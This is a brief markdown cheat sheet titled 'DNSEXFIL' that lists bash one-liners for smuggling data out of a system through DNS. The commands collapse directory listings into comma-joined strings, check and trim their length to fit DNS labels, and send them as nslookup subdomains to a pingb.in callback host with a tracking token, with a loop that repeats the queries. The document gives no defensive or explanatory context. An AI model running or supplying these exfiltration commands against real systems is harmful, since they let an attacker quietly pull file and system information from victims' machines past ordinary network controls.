# DNSEXFIL - Data Exfiltration via DNS

```bash

echo `sed -n '2p' main.c` # print specific lines from a text file

`sed ':a;N;$!ba;s/\n/,/g' <<< $(ls)`  #concat ls output for dns query	

`sed ':a;N;$!ba;s/\n/,/g' <<< $(ls /)` | LC_ALL=C.UTF-8 wc -m # get len of command results 

nslookup `sed ':a;N;$!ba;s/\n/,/g' <<< $(ls) | LC_ALL=C.UTF-8 wc -m`.3544271fd625d1d8d62798bba753 pingb.in

`sed ':a;N;$!ba;s/\n/,/g' <<< $(ls /)` | head -c 12

echo `ls /` | cut -c 1-63

for i in {1..N};do nslookup `sed ':a;N;$!ba;s/\n/,/g' <<< $(ls /)`.3544271fd625d1d8d62798bba711 pingb.in;done
```
